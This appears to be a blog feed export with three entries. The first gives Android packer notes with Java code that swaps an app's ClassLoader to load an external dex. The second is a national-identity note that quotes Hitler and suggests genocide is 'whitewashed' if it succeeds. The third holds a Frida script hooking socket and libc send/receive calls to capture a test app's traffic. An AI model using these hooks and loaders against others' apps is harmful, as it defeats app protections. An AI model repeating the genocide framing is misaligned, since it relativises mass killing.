<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230825163132654.png" class="" title="image-20230825163132654">

<p>当壳函数attachBaseContext和onCreate中执行完加密的dex文件的解密后，通过自定义的ClassLoader在内存中加载解密后的dex文件。为了解决后续应用在加载执行解密后的dex文件中的Class和Method的问题，接下来就是通过利用java的反射修复一系列需要用到的变量。其中最为重要的一个变量就是应用运行中的ClassLoader，只有ClassLoader被修正后，应用才能够正常的加载并调用dex中的类和方法，否则的话由于ClassLoader的双亲委派机制，最终会报ClassnotFound异常，应用崩溃退出。ClassLoader是一个至关重要的变量，所有的应用中加载的dex文件最终都在app的ClassLoader中。</p>
<p>因此，只要获取到加固应用最终通过反射设置后的ClassLoader，我们就可以通过一系列反射最终获取到当前应用所加载的解密后的内存中的Dex文件。</p>
<p>随着加壳技术的发展，为了对抗dex整体加固容易被内存dump来得到原始dex的问题，各加固厂商又结合hook技术，通过hook dex文件中类和方法加载执行过程中的关键流程，来实现在函数执行前才进行解密操作的指令抽取的解决方案。此时，就算是对内存中的dex整体进行了dump，但是由于其方法的最为重要的函数体中的指令被加密，导致无法对相关的函数进行脱壳。由此Fupk3诞生了，该脱壳工具通过欺骗壳而主动调用dex中的各个函数，完成调用流程，让壳主动解密对应method的指令区域，从而完成对指令抽取型壳的脱壳。</p>
<h4 id="分析源码并写代码加载其它dex中Activity"><a href="#分析源码并写代码加载其它dex中Activity" class="headerlink" title="分析源码并写代码加载其它dex中Activity"></a>分析源码并写代码加载其它dex中Activity</h4><ol>
<li><p>先通过反射获取到ActivityThread，它是一个单例模式，可以获取到app进程当中仅有的ActivityThread的实例</p>
</li>
<li><p>接下来可以通过反射获取到mPackages的ArrayMap对象（这里的ArrayMap用于存储已加载的应用程序包的信息）</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824220114889.png" class="" title="image-20230824220114889">
</li>
<li><p>通过mPackages获取到loadApk：（LoadedApk是Android中表示已加载应用程序包信息的类，它包含了应用程序的资源、类加载器、类信息等，其中就保存有我们加载app组件的mClassLoader）</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824215203666.png" class="" title="image-20230824215203666">
</li>
<li><p>通过LoadedApk获取到mClassLoader字段（这就是接下来app运行过程中用于加载相关的四大组件的这些类的classLoader）</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824222103300.png" class="" title="image-20230824222103300"></li>
</ol>
<h4 id="接下来写代码去加载dex中的Activity"><a href="#接下来写代码去加载dex中的Activity" class="headerlink" title="接下来写代码去加载dex中的Activity"></a>接下来写代码去加载dex中的Activity</h4><ul>
<li><p>如果继续按照上一节相同的代码去加载Activity的话会出现找不到dex中的方法的问题，无法启动我们的目标Activity</p>
</li>
<li><p>这个问题有两个解决方案：</p>
<ol>
<li><p><strong>替换</strong>系统组件的类加载器为我们的DexClassloader，同时设置DexClassLoader的parent节点为系统组件类加载器也就是pathClassLoader</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824223243415.png" class="" title="image-20230824223243415">
</li>
<li><p>打破原有的双亲关系，在系统组件类加载器和BootClassLoader的中间<em>插入</em>我们自己的DexClassLoader</p>
<ul>
<li><p>这种方法和双亲委派密切相关，不替换原来组件的mClassLoader，保持原来的mClassLoader。但是呢如果再当前app进程的BootClassLoader和PathClassLoader之间插入我们的dexClassLoader，那在接下来启动其它的组件的时候，就会由于双亲委派虽然找不到pathClassLoader但是它的父节点是能找得到的。这种方法不需要通过繁琐的反射过程一步一步找到主键的mClassLoader。</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824223416570.png" class="" title="image-20230824223416570"></li>
</ul>
</li>
</ol>
<h5 id="第一种解决方法的代码：load03-java"><a href="#第一种解决方法的代码：load03-java" class="headerlink" title="第一种解决方法的代码：load03_java"></a>第一种解决方法的代码：<strong>load03_java</strong></h5><pre><code class="java">package com.kanxue.load03_java;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.ArrayMap;
import android.util.Log;

import java.io.File;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.Manifest;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 检查是否已经获得外部存储权限
        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                // 请求权限
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        PERMISSION_REQUEST_CODE);
            } else {
                // 已经有权限，执行操作
                performAction();
            }
        }
    }

    // 处理权限请求结果
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 用户授予了权限，执行操作
                performAction();
            } else {
                // 用户拒绝了权限，可以做一些处理，比如显示一个提示信息
                Log.d("Permission", "External storage permission denied");
            }
        }
    }

    // 在获得权限后执行的操作
    private void performAction() {
        // 在这里执行加载DEX文件并启动Activity的操作
        startTestActivity(this, "/sdcard/4.dex");
    }

    // 用于替换类加载器的方法
    public void replaceClassLoader(ClassLoader classLoader) {
        try {
            // 加载 android.app.ActivityThread 类
            Class&lt;?&gt; ActivityThreadClazz = classLoader.loadClass("android.app.ActivityThread");

            // 获取 currentActivityThread 静态方法
            Method currentActivityThreadMethod = ActivityThreadClazz.getDeclaredMethod("currentActivityThread");
            currentActivityThreadMethod.setAccessible(true);

            // 调用 currentActivityThread 方法，获取 ActivityThread 实例
            Object activityThread = currentActivityThreadMethod.invoke(null);

            // 获取 ActivityThread 类中的 mPackages 字段
            // final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();
            Field mPackagesField = ActivityThreadClazz.getDeclaredField("mPackages");
            mPackagesField.setAccessible(true);

            // 获取 mPackages 字段在 activityThread 实例中的值，它是一个 ArrayMap 对象
            ArrayMap mPackagesObj = (ArrayMap) mPackagesField.get(activityThread);

            // 从 mPackages 中获取对当前应用程序包的 WeakReference 引用
            WeakReference wr = (WeakReference) mPackagesObj.get(this.getPackageName());

            // 获取 WeakReference 中的实际对象，这是 LoadedApk 类的一个实例
            Object loadApkObj = wr.get();

            // 加载 android.app.LoadedApk 类
            Class loadedApkClazz = classLoader.loadClass("android.app.LoadedApk");

            // 获取 LoadedApk 类中的 mClassLoader 字段
            //private ClassLoader mClassLoader;
            Field mClassLoaderField = loadedApkClazz.getDeclaredField("mClassLoader");
            mClassLoaderField.setAccessible(true);

            // 将 LoadedApk 实例的 mClassLoader 字段设置为传入的类加载器
            mClassLoaderField.set(loadApkObj, classLoader);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public void startTestActivity(Context context, String dexfilepath) {
        // 获取应用的私有目录，用于加载DEX文件和库文件
        File optfile = context.getDir("opt_dex", 0);
        File libfile = context.getDir("lib_path", 0);

        // 获取主Activity的类加载器和上下文的类加载器
        ClassLoader parentClassloader = MainActivity.class.getClassLoader();
        ClassLoader tmpClassloader = context.getClassLoader();

        // 创建一个DexClassLoader，用于加载DEX文件中的类
        DexClassLoader dexClassLoader = new DexClassLoader(
                dexfilepath,
                optfile.getAbsolutePath(),
                libfile.getAbsolutePath(),
                MainActivity.class.getClassLoader());

        // 替换类加载器，使外部类能够在应用中被访问
        replaceClassLoader(dexClassLoader);

        Class&lt;?&gt; clazz = null;
        try {
            // 从DEX文件加载指定的类
            clazz = dexClassLoader.loadClass("com.kanxue.test01_java.TestActivity");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        // 启动加载的外部Activity
        context.startActivity(new Intent(context, clazz));
    }
}
</code></pre>
<p><strong>test01_java</strong></p>
<pre><code class="java">package com.kanxue.test01_java;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class TestActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // setContentView(R.layout.activity_main);
        Log.i("xiaoeryu","i am TestActivity.onCreate");
    }
}
</code></pre>
<p><strong>执行结果</strong></p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824223613663.png" class="" title="image-20230824223613663">

<h5 id="第二种解决方法：load04"><a href="#第二种解决方法：load04" class="headerlink" title="第二种解决方法：load04"></a>第二种解决方法：<strong>load04</strong></h5><pre><code class="java">package com.kanxue.load04;

import androidx.annotation.NonNull;
import android.app.Activity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.lang.reflect.Field;

import android.Manifest;

import dalvik.system.DexClassLoader;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 检查是否已经获得外部存储权限
        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                // 请求权限
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        PERMISSION_REQUEST_CODE);
            } else {
                // 已经有权限，执行操作
                performAction();
            }
        }
    }

    // 处理权限请求结果
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 用户授予了权限，执行操作
                performAction();
            } else {
                // 用户拒绝了权限，可以做一些处理，比如显示一个提示信息
                Log.d("Permission", "External storage permission denied");
            }
        }
    }

    // 在获得权限后执行的操作
    private void performAction() {
        // 在这里执行加载DEX文件并启动Activity的操作
        startTestActivitySecondlyMethod(this, "/sdcard/5.dex");
    }

    // 使用第二种方法启动测试Activity
    public void startTestActivitySecondlyMethod(Context context, String dexFilePath) {
        // 获取应用程序的私有目录，用于存放优化后的DEX文件和本地库
        File optDir = context.getDir("opt_dex", 0);
        File libDir = context.getDir("lib_path", 0);

        // 获取系统类加载器和引导类加载器
        ClassLoader pathClassLoader = MainActivity.class.getClassLoader();
        ClassLoader bootClassLoader = MainActivity.class.getClassLoader().getParent();

        // 创建DexClassLoader来加载外部的DEX文件
        DexClassLoader dexClassLoader = new DexClassLoader(
                dexFilePath,                  // DEX文件路径
                optDir.getAbsolutePath(),     // 优化后的DEX文件存放目录
                libDir.getAbsolutePath(),     // 本地库存放目录
                bootClassLoader);             // 引导类加载器作为父加载器

        try {
            // 使用反射设置系统类加载器的父加载器为DexClassLoader
            Field parentField = ClassLoader.class.getDeclaredField("parent");
            parentField.setAccessible(true);
            parentField.set(pathClassLoader, dexClassLoader);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        Class&lt;?&gt; clazz = null;
        try {
            // 加载外部DEX文件中的类
            clazz = dexClassLoader.loadClass("com.xiaoeryu.test04.TestActivity");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        // 启动外部加载的Activity
        context.startActivity(new Intent(context, clazz));
    }
}
</code></pre>
<p><strong>test04</strong></p>
<pre><code class="java">package com.xiaoeryu.test04;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

public class TestActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        Log.i("xiaoeryu", "i am from TestActivity.onCreate");
    }
}
</code></pre>
<ul>
<li><p>这个代码除了要注意前面的几点之外还要把constraintlayout降一下级，不然运行的时候会有库版本冲突的问题</p>
<img src="/2023/08/24/%E5%8A%A0%E5%A3%B3APP%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%92%8CClassLoader%E4%BF%AE%E6%AD%A3/image-20230824223840687.png" class="" title="image-20230824223840687">
</li>
<li><p>这两种方案都可以解决加载dex中Activity的问题，相对来说第一种再加壳厂商中比较常用，通过替换app组件的ClassLoader: mClassLoader来实现，让插件类具有生命周期。这两种方案都要用大量的反射相关的api来实现。</p>
</li>
</ul>
</li>
</ul>
<h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>在插入DexClassLoader的代码后面，插入log看一下双亲委派的调用关系</p>
<pre><code class="java">        // 看一下双亲委派的调用关系
        ClassLoader tmpClassLoader = pathClassloader;
        ClassLoader parentClassLoader = pathClassloader.getParent();
        while (parentClassLoader != null){
            Log.i("xiaoeryu", "当前节点: " + tmpClassLoader + "--父节点: " + parentClassLoader);
            tmpClassLoader = parentClassLoader;
            parentClassLoader = parentClassLoader.getParent();
        }
        Log.i("xiaoeryu", "根节点: " + tmpClassLoader);
</code></pre>
<p><strong>运行结果</strong></p>
<pre><code>当前节点: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.kanxue.load04-zqQtFmn29CDDYSwO8gpsPQ==/base.apk"],nativeLibraryDirectories=[/data/app/com.kanxue.load04-zqQtFmn29CDDYSwO8gpsPQ==/lib/arm64, /system/lib64, /vendor/lib64]]]--父节点: dalvik.system.DexClassLoader[DexPathList[[dex file "/sdcard/5.dex"],nativeLibraryDirectories=[/data/user/0/com.kanxue.load04/app_lib_path, /system/lib64, /vendor/lib64]]]
当前节点: dalvik.system.DexClassLoader[DexPathList[[dex file "/sdcard/5.dex"],nativeLibraryDirectories=[/data/user/0/com.kanxue.load04/app_lib_path, /system/lib64, /vendor/lib64]]]--父节点: java.lang.BootClassLoader@118830f
根节点: java.lang.BootClassLoader@118830f
</code></pre>
<p>题外话：</p>
<p>对于用户提交的一个带加固的app之后呢，加固厂商一般分两种情况去处理：</p>
<ol>
<li>这个app的AndroidManifest.xml当中没有声明这个application的话，处理起来较为简单一些，加固厂商只需要添加一个application就可以了，然后在这个application里面完成一些classloader的替换</li>
<li>如果已经有application的话呢，就需要一个代理的application。这种情况下壳的application不仅要完成解密dex以及classloader的一些相关修复还要完成解密dex之后原来application中两个函数（attachBaseContext和onCreate）的调用</li>
</ol>
<p>参考文章：<a href="https://bbs.kanxue.com/thread-252630.htm#msg_header_h2_1">FART：ART环境下基于主动调用的自动化脱壳方案</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Android加壳</tag>
        <tag>加壳和运行时的机制</tag>
      </tags>
  </entry>
  <entry>
    <title>国家认同感的构建</title>
    <url>/2023/10/06/%E5%9B%BD%E5%AE%B6%E8%AE%A4%E5%90%8C%E6%84%9F%E7%9A%84%E6%9E%84%E5%BB%BA/</url>
    <content><![CDATA[<p>人民对国家的认同感是一个国家存在的基础，看B站up思维实验室<a href="https://www.bilibili.com/video/BV1U94y1h7th/?spm_id_from=333.999.0.0&amp;vd_source=8ad208b9073775fdac95e7fb1782f915">个人主义盛行的美国是怎么建立国家认同的</a>讲美国一个讲求个人自由主义的国家怎么构建这种需要个人牺牲的国家认同感的笔记和一些想法。</p>
<ul>
<li>天下熙熙皆为利来，天下攘攘皆为利往。</li>
</ul>
<span id="more"></span>

<p>以下笔记未亲自查阅史实资料，均来自于对up视频的笔记难免片面</p>
<h3 id="美国"><a href="#美国" class="headerlink" title="美国"></a>美国</h3><p>关于美国的国家认同感构建：</p>
<ol>
<li><p>美国首先是一个移民国家，建国初期的人口来自于欧洲大陆各个国家民族的人口，自然不会天然具有国家认同感</p>
</li>
<li><p>最初的联系来自于各团体联合起来对英国的反抗。但是独立战争打完之后又缺乏继续联合的必要性</p>
</li>
<li><p>另一方面来自于宗教的影响，虽然当时在新大陆上的教会绝大多数是新教，但是各为小团体且在互相争夺对教义的解释权，不具备成为国教帮助美国构建国家认同的良好工具。</p>
</li>
<li><p>这期间由于英、法、荷兰等周边殖民地的压力一定程度上维持了政府不散架。后来又凑钱从拿破仑手里买来了路易斯安那殖民地，后来又因为想从英国手里抢加拿大南部五大湖地区的肥沃土地，跟英国打了一架被烧了白宫。后来跟英国达成协议帮助英国看守英国跟原住民之间的隔离带，由此开始了对原住民的掠夺形成了新的利益联合、以及期间西班牙走后对墨西哥割走一半领土。</p>
</li>
<li><p>后来在新教谋求扩大自身影响下，开始向美洲大陆其他地区扩张。以上帝选民的身份对周围进行传教。加上临时政府政策对原住民的驱赶，以及放纵移民对原住民的掠夺，在这种情势下开始了西进运动。 从原住民手里掠夺土地之后国家承认其对掠夺来的土地的所有权，扩展为国家边境，再由政府对这些利益进行保护，由此激发了移民对政府的认同。不过实在是全员恶人了。</p>
</li>
<li><p>至于美国为什么要对美洲印第安人赶尽杀绝，也许是因为文化语言的不同，教化难度较大，以及北方政权对于杀死印第安人来削弱南方种植园经济实力也有一定兴趣。而黑奴经过几代的繁衍已经接受了一定程度的同化，由此北方政权开启了废奴运动来占领道德话语权进一步削弱南方政权种植园经济（当时可以杀印第安人但是绝对不能奴役印第安人），之后北方颁布法案吸引大量底层人士参与西进运动，号召参与者对西部进行扩张。扩张的动力来源类似于募兵制，平时耕作战时号召动员人民为保卫自己的土地而战，有了土地之后自然渴望秩序。政府进一步扩展了自己的影响力。</p>
</li>
<li><p>美洲占领的差不多之后，此时全球其他地方都已经被列强瓜分完了，罗斯福只能推行干涉主义方针。充当国际警察来干涉他国外交、经济、政治来维护自身利益。这一过程中公司、财团、买办攫取了巨大的利益更加维护美国秩序。</p>
</li>
<li><p>所以，现在美国也有一部分国家认同感，是基于基督教带来的思想认同</p>
</li>
<li><p>同时美国也从基因层面就是一个对外扩张型的国家，不管是领土、经济、意识形态。</p>
</li>
</ol>
<p><strong>南北战争带来的奴隶制度解体清楚了工业化在美国扩散的障碍，西进运动塑造了美国人的自信心和霸权情结踩着印第安人建立了国家认同，西部的丛林社会塑造了美国的自由主义</strong></p>
<p>这带来了一个问题就是美国推广自己的制度的时候，会被人拿它的建国历史来反对。但是它的国家属性决定了它不能停止对外的扩张。这些一定程度上带来了世界范围内的反美情绪和国内的对立</p>
<h5 id="另外："><a href="#另外：" class="headerlink" title="另外："></a>另外：</h5><blockquote>
<p>罗斯福新政的作用和意义：</p>
<ol>
<li>开创了国家干预经济的新模式；</li>
<li>加强了国家对经济的干预和管理；</li>
<li>促使美国从经济危机中走了出来，重新成为世界经济强国；</li>
<li>促使美国改变原有的外交政策，加强国际间的合作；</li>
<li>遏制了美国滋生的法西斯主义；</li>
</ol>
</blockquote>
<h3 id="印度"><a href="#印度" class="headerlink" title="印度"></a>印度</h3><p>关于印度这个地方，印度来自于印度河文明，曾经数次被外来文明征服（中亚的雅利安人（婆罗门教）、孔雀王朝（佛教）、笈多王朝、中世纪小国林立印度教兴起、突厥蒙古、莫卧儿王朝、英国殖民地）。所以印度应该算是一个各国文化汇聚之地。印度各邦似乎也不具有统一的国家认同，但是现今印度有一个主流的印度教，是一个强有力的思想统一工具，一个具有政治抱负的领导人应该不会放弃对这个工具的使用。</p>
<p>所以印度现在再次构建国家认同的方式跟美国有部分相似之处，基于宗教的意识形态构建统一的国家认同，所以莫迪现在会掌控印度教，并且推动印度教的改革，扩大宗教的认同，建立更强的国家认同。比如印度教的种姓制度长远来看是需要根除的，但是应该并不是现阶段迫在眉睫的事情。跟中国的边境摩擦也是制造紧张氛围压低国内反对声音。</p>
<h3 id="法西斯德国"><a href="#法西斯德国" class="headerlink" title="法西斯德国"></a>法西斯德国</h3><p>希特勒当初的种族灭绝政策不是一种对美国屠杀美洲印第安土著的一种效仿，美国既然成功了就能洗白，法西斯德国如果成功了也未必不能洗白。</p>
<p>**希特勒的生存空间理论</p>
<blockquote>
<p>我们只有一个任务，通过引入德国人来实现东欧的德国化，并像对待印第安人一样对待那里的原住民。我们将以冷酷的决心坚持下去，因为我们自己是历史意志的执行者，当前人们对我们的看法并不重要。</p>
<p>​																									——希特勒会议纪要 1941/10/17</p>
</blockquote>
]]></content>
      <categories>
        <category>社科</category>
      </categories>
      <tags>
        <tag>国家认同感构建</tag>
      </tags>
  </entry>
  <entry>
    <title>协议枚举、爆破及算法模拟</title>
    <url>/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<p>很多的加密算法是在so中编写的，并且加了混淆，死磕的话逆向难度是比较大的，在不必要的情况下可以尝试去主动调用算法实现目的：</p>
<h4 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h4><blockquote>
<p>测试用的demo</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240707223012625.png" class="" title="image-20240707223012625">
</blockquote>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240707222451979.png" class="" title="image-20240707222451979">



<p>这里使用我们前面写的脚本来抓包，因为协议都是TCP所以可以使用我们前面写的抓取javaTCP的代码，再加上libc</p>
<p>上代码</p>
<pre><code class="js">function LogPrint(log) {
    var theDate = new Date();
    var hour = theDate.getHours();
    var minute = theDate.getMinutes();
    var second = theDate.getSeconds();
    var mSecond = theDate.getMilliseconds();

    hour &lt; 10 ? hour = "0" + hour : hour;
    minute &lt; 10 ? minute = "0" + minute : minute;
    second &lt; 10 ? second = "0" + second : second;
    mSecond &lt; 10 ? mSecond = "00" + mSecond : mSecond &lt; 100 ? mSecond = "0" + mSecond : mSecond;
    var time = hour + ":" + minute + ":" + second + ":" + mSecond;
    var threadid = Process.getCurrentThreadId();
    console.log("[" + time + "]" + "-&gt;threadid:" + threadid + "--" + log);

}

function printJavaStack(name) {
    Java.perform(function () {
        var Exception = Java.use("java.lang.Exception");
        var ins = Exception.$new("Exception");
        var straces = ins.getStackTrace();
        if (straces != undefined &amp;&amp; straces != null) {
            var strace = straces.toString();
            var replaceStr = strace.replace(/,/g, " \n ");
            LogPrint("=============================" + name + " Java Stack strat=======================");
            LogPrint(replaceStr);
            LogPrint("=============================" + name + " Java Stack end======================= \n ");
            Exception.$dispose();
        }
    });
}
function printNativeStack(context, name) {
    var array = Thread.backtrace(context, Backtracer.ACCURATE);
    var trace = array.map(DebugSymbol.fromAddress).join("\n");
    LogPrint("=============================" + name + " Native Stack strat=======================");
    LogPrint(trace);
    LogPrint("=============================" + name + " Native Stack end======================= \n ");
}

function isprintable(value) {
    if (value &gt;= 32 &amp;&amp; value &lt;= 126) {
        return true;
    }
    return false;
}

function getsocketdetail(fd) {
    var type = Socket.type(fd);
    if (type !== null) {
        var peer = Socket.peerAddress(fd);
        var local = Socket.localAddress(fd);
        // return `type:${type}, address:${JSON.stringify(peer)}, local:${JSON.stringify(local)}`;
        return ("type: " + type + ", address: " + JSON.stringify(peer) + ", local: " + JSON.stringify(local));
    }
    return "unknown";
}

function hooktcp() {
    Java.perform(function () {
        var SocketClass = Java.use('java.net.Socket');
        SocketClass.$init.overload('java.lang.String', 'int').implementation = function (arg0, arg1) {
            console.log("[" + Process.getCurrentThreadId() + "]new Socket connection: " + arg0 + ",port: " + arg1);
            printJavaStack('tcp connect...')
            return this.$init(arg0, arg1);
        }
        var SocketInputStreamClass = Java.use('java.net.SocketInputStream');
        //socketRead0
        SocketInputStreamClass.socketRead0.implementation = function (arg0, arg1, arg2, arg3, arg4) {
            var size = this.socketRead0(arg0, arg1, arg2, arg3, arg4);
            //console.log("[" + Process.getCurrentThreadId() + "]socketRead0:size:" + size + ",content:" + JSON.stringify(arg1));
            var bytearray = Java.array('byte', arg1);
            var content = '';
            for (var i = 0; i &lt; size; i++) {
                if (isprintable(bytearray[i])) {
                    content = content + String.fromCharCode(bytearray[i]);
                }
            }
            var socketimpl = this.impl.value;
            var address = socketimpl.address.value;
            var port = socketimpl.port.value;

            console.log("\naddress:" + address + ",port: " + port + "\n" + JSON.stringify(this.socket.value) + "\n[" + Process.getCurrentThreadId() + "]receive: " + content);
            printJavaStack('socketRead0')
            return size;
        }
        var SocketOutPutStreamClass = Java.use('java.net.SocketOutputStream');
        SocketOutPutStreamClass.socketWrite0.implementation = function (arg0, arg1, arg2, arg3) {
            var result = this.socketWrite0(arg0, arg1, arg2, arg3);
            //console.log("[" + Process.getCurrentThreadId() + "]socketWrite0:len:" + arg3 + "--content:" + JSON.stringify(arg1));
            var bytearray = Java.array('byte', arg1);
            var content = '';
            for (var i = 0; i &lt; arg3; i++) {

                if (isprintable(bytearray[i])) {
                    content = content + String.fromCharCode(bytearray[i]);
                }
            }
            var socketimpl = this.impl.value;
            var address = socketimpl.address.value;
            var port = socketimpl.port.value;
            console.log("send address:" + address + ",port: " + port + "[" + Process.getCurrentThreadId() + "]send: " + content);
            console.log("\n" + JSON.stringify(this.socket.value) + "\n[" + Process.getCurrentThreadId() + "]send: " + content);
            printJavaStack('socketWrite0')
            return result;
        }
    })
}

function hooklibc() {
    var libcmodule = Process.getModuleByName("libc.so");
    var recvfrom_addr = libcmodule.getExportByName("recvfrom");
    var sendto_addr = libcmodule.getExportByName("sendto");
    // console.log(`${recvfrom_addr} --- ${sendto_addr}`);
    console.log(recvfrom_addr + "---" + sendto_addr);

    Interceptor.attach(recvfrom_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg3 = args[3];
            this.arg4 = args[4];
            this.arg5 = args[5];

            LogPrint("go into libc.so-&gt;recvfrom");

            var result = getsocketdetail(this.arg0.toInt32());
            if (result.indexOf("udp") &gt; 0) {
                handleUdp('recvfrom', this.arg4, this.arg5);
            }

            printNativeStack(this.context, "recvfrom");
        },
        onLeave: function (retval) {
            var size = retval.toInt32();
            if (size &gt; 0) {
                var result = getsocketdetail(this.arg0.toInt32());
                // console.log(`${result} --- libc.so-&gt;recvfrom: ${hexdump(this.arg1, { length: size })}`);
                console.log(result + "--- libc.so-&gt;recvfrom: " + hexdump(this.arg1, { length: size }))
            }
            LogPrint("leave libc.so-&gt;recvfrom");
        }
    });

    Interceptor.attach(sendto_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg3 = args[3];
            this.arg4 = args[4];
            this.arg5 = args[5];

            LogPrint("go into libc.so-&gt;sendto");

            var result = getsocketdetail(this.arg0.toInt32());
            if (result.indexOf("udp") &gt; 0) {
                handleUdp('sendto', this.arg4, this.arg5);
            }

            printNativeStack(this.context, "sendto");
        },
        onLeave: function (retval) {
            var size = this.arg2.toInt32();
            if (size &gt; 0) {
                var result = getsocketdetail(this.arg0.toInt32());
                // console.log(`${result} --- libc.so-&gt;sendto: ${hexdump(this.arg1, { length: size })}`);
                console.log(result + "--- libc.so-&gt;sendto: " + hexdump(this.arg1, { length: size }))
            }
            LogPrint("leave libc.so-&gt;sendto");
        }
    });
}

function main() {
    hooktcp();
    hooklibc();
}

setImmediate(main)
</code></pre>
<p>抓包：目标App是我们前面说的测试用App</p>
<p><code>frida -UF -l hooksocket.js --no-pause -o log.txt</code></p>
<p>测试结果：</p>
<img src="/2024/07/29/%E5%8D%8F%E8%AE%AE%E6%9E%9A%E4%B8%BE%E3%80%81%E7%88%86%E7%A0%B4%E5%8F%8A%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20240708222939875.png" class="" title="image-20240708222939875">

<ul>
